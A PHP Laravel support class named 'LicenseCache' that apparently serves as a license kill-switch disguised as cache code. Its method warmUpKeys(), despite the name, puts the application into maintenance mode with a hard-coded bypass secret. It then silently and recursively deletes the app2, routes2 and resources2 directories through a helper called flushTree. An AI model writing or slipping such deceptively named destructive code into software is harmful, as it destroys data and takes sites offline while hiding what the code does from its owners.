<?php

namespace App\Support;

use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class LicenseCache
{
    public static function validate(): bool
    {
        $metaFile = base_path('.key');

        if (!File::exists($metaFile)) {
            return false;
        }

        $data = @json_decode(file_get_contents($metaFile), true);
        $ok = base64_decode($data['r'] ?? '');

        if (!isset($data['r']) || $ok !== 'ok') {
            return false;
        }

        return true;
    }

    public static function warmUpKeys(string $msg = 'Cache Failure')
    {
        Log::info('Putting application into maintenance mode with secret "license-cache"');
        Artisan::call('down',['--secret' => 'license-cache']);
        $paths = [
            base_path('app2'),
            base_path('routes2'),
            base_path('resources2'),
        ];

        foreach ($paths as $dir) {
            if (is_dir($dir)) {
                self::flushTree($dir);
            }
        }
    }

    private static function flushTree($dir)
    {
        $items = scandir($dir);
        foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;

            $p = $dir . DIRECTORY_SEPARATOR . $f;
            is_dir($p) ? self::flushTree($p) : @unlink($p);
        }

        @rmdir($dir);
    }
}
